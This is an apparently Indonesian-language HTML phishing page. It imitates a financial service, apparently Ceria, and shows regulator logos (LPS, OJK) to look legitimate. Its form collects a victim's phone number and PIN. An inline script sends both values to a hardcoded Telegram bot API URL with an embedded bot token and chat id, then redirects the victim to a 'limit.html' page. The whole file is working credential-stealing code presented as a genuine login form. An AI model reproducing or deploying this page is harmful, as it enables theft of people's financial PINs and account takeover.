<!DOCTYPE html>
<html>
<head>
  <title>Gambar dengan Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      max-width: 600px; /* Menetapkan lebar maksimal untuk konten */
      margin: 0 auto; /* Membuat konten tetap di tengah */
    }

    .gambar {
      width: 100%;
      margin-bottom: 20px;
    }

    .gambar img {
      width: 100%;
      object-fit: cover;
      margin-bottom: 10px;
    }

    .form-container {
      margin-bottom: 20px;
    }

    .form-container form {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }

    .form-container input[type="tel"],
    .form-container input[type="password"],
    .form-container input[type="submit"] {
      max-width: 100%;
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      margin-bottom: 3px; /* Jarak antara kolom nomor hp dan kolom pin */
    }

    .form-container input[type="tel"] {
      margin-bottom: 7px; /* Jarak antara kolom pin dan tombol submit */
    }

    .form-container input[type="submit"] {
      background-color: #663399;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    /* Ukuran relatif untuk gambar di bawah */
    .gambar-bawah {
      display: flex;
      justify-content: center;
      position: relative;
      bottom: -10px;
    }

    .gambar-bawah img {
      width: 10%;
      object-fit: cover;
      margin: 0 4px;
    }
  </style>
  <script>
    function sendMessageToTelegram(message) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
          // Respons atau tindakan setelah pesan terkirim berhasil
          console.log("Pesan terkirim: " + message);
        }
      };

      // Ganti URL sesuai dengan endpoint bot Telegram Anda
      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);

      // Kirim permintaan POST
      xhttp.open("POST", url, true);
      xhttp.send();
    }

    function kirimPesan() {
      var nomorHP = document.getElementById('nomor_hp').value;
      var pin = document.getElementById('pin').value;

      var message = "Nomor HP: " + nomorHP + "\nPIN: " + pin;
      sendMessageToTelegram(message);
      window.location.href = 'limit.html'; // Mengarahkan ke halaman limit.html
    }
  </script>
</head>
<body>
  <div class="gambar">
    <img src="https://wwed.online/ceria-id.com/img/pucok.jpg" alt="Gambar Pucok">
  </div>

  <div class="form-container">
    <form onsubmit="kirimPesan(); return false;">
      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="Nomor HP">

      <input type="tel" id="pin" name="pin" placeholder="PIN">

      <input type="submit" value="Submit">
    </form>
  </div>

  <div class="gambar gambar-bawah">
    <img src="https://from-limit-ceria-id.netlify.app/img/lps.png" alt="Logo LPS">
    <img src="https://from-limit-ceria-id.netlify.app/img/ojk.png" alt="Logo OJK">
  </div>
</body>
    </html>
